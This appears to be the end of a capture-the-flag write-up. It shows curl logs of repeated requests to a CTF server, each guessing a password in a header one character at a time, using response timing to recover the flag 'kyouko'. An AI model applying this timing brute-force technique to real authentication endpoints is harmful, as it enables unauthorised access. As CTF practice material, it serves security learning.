	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.4580621474701354* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukW
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:30 GMT
	< Content-Length: 32
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.058393137651038485* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukX
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:31 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.6218029792841919* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukY
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:31 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.8287232987409219* Rebuilt URL to: ctfclubiiit.tk:8080/
	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyoukZ
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:32 GMT
	< Content-Length: 30
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	Time taken: 0.3412310248097701% 

We are rewarded for our efforts with this. 

	*   Trying 54.175.180.76...
	* Connected to ctfclubiiit.tk (54.175.180.76) port 8080 (#0)
	> GET / HTTP/1.1
	> Host: ctfclubiiit.tk:8080
	> User-Agent: curl/7.47.0
	> Accept: */*
	> password:kyouko
	> 
	< HTTP/1.1 200 OK
	< Server: nginx/1.10.0 (Ubuntu)
	< Date: Sun, 26 Feb 2017 05:24:15 GMT
	< Content-Length: 12
	< Connection: keep-alive
	< 
	* Connection #0 to host ctfclubiiit.tk left intact
	flag: kyouko* Rebuilt URL to: ctfclubiiit.tk:8080/

Flag
====

kyouko